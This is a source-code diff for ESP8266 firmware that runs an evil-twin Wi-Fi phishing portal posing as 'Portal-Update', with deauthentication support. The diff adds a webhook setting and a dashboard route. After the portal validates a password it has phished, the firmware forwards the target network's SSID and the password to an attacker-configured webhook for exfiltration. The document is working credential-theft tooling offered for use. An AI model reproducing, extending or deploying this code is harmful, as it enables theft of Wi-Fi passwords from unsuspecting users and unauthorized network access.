@@ -14,6 +14,7 @@
 #include "favicon.h"
 
 #define DefaultSSID "Portal-Update" //Default SSID name
+String webhookUrl = ""; //put your webhook url here if you dont want to re-enter it on reboot
 
 #define DNS_PORT 53 //Port for the DNS Server
 const IPAddress APIP(192, 168, 1, 1); //The ip of the esp8266 itself where you can acces the dashboard and index page
@@ -39,7 +40,7 @@ void handleDashboard() { //handles the dashboard page
   
   bool deauthing = false; if(digitalRead(D5) == 0){ deauthing = true; }
   
-  webServer.send(200, "text/html", dashboard(indexLang, favicon(), targetSSID, allPass, networks, validate, deauthing));
+  webServer.send(200, "text/html", dashboard(indexLang, favicon, targetSSID, allPass, networks, validate, deauthing, webhookUrl));
 
   if (webServer.hasArg("led_off")){ digitalWrite(LED_BUILTIN, HIGH); redirect("/dashboard"); } //calls the led off function if the button on the dashboard is pressed
 }
@@ -74,6 +75,13 @@ void handlePost(){
   if (slaveStatus == 3 || validate == false){ //if conected or validation is turned off start password saving and redirecting to the restarting page
     Serial.printf("Password Correct\n");
     redirect("/restarting");
+
+    if(webhookUrl != ""){ 
+      esp.printf("webhook|"); delay(100);
+      esp.print(webhookUrl); delay(500);
+      esp.print(targetSSID); delay(500);
+      esp.print(pass);
+    }
 
     pass = "<tr><td>" + pass + "</td><td>" + millis()/1000 + "</td></tr>"; //Adding password and seconds after bootup in a ordered list.
     allPass += pass;                       //Updating the full passwords.
@@ -175,6 +183,16 @@ void setValidate(){
   Serial.printf("=====SetValidation=====\n\n");
 }
 
+void setWebhookUrl(){
+  redirect("/dashboard");
+  Serial.printf("=====setWebhookUrl=====\n");
+
+  webhookUrl = webServer.arg("url");
+
+  if(webhookUrl != ""){ Serial.printf("Webhook Url set to %s\n", webhookUrl.c_str()); } else { Serial.print("Webhook disabled\n"); }
+  Serial.printf("=====setWebhookUrl=====\n\n");
+}
+
 void setup(){
   Serial.begin(115200);
   EEPROM.begin(512);
@@ -221,6 +239,7 @@ void setup(){
   webServer.on("/incorrectPass", [](){ webServer.send(200, "text/html", wrongPass(indexLang, favicon(), targetSSID)); });
   webServer.on("/ssid", handlePostSSID);
   webServer.on("/validate", setValidate);
+  webServer.on("/webhook", setWebhookUrl);
   
   
   webServer.onNotFound([](){  webServer.send(200, "text/html", Index(indexLang, favicon(), targetSSID)); });
